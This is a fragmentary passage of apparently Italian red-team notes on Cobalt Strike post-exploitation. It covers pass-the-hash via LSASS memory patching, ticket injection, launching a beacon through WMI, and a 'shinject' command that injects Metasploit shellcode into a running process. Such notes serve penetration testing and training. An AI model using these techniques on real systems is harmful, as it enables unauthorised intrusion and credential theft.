...
## Vai su Visualizza -> Screenshots per vederli
...
## Pass the hash
## Questo processo di modifica richiede la patching della memoria LSASS che è un'azione ad alto rischio, richiede privilegi di amministratore locale e non è molto praticabile se Protected Process Light (PPL) è abilitato.
...
### Inserisci ticket nella sessione di accesso generata
...
## Per eseguire un beacon con wmi (non è nel comando jump) carica semplicemente il beacon ed eseguilo
...
ps
shinject &#x3C;pid> x64 C:\Payloads\msf.bin #Inietta shellcode di metasploit in un processo x64
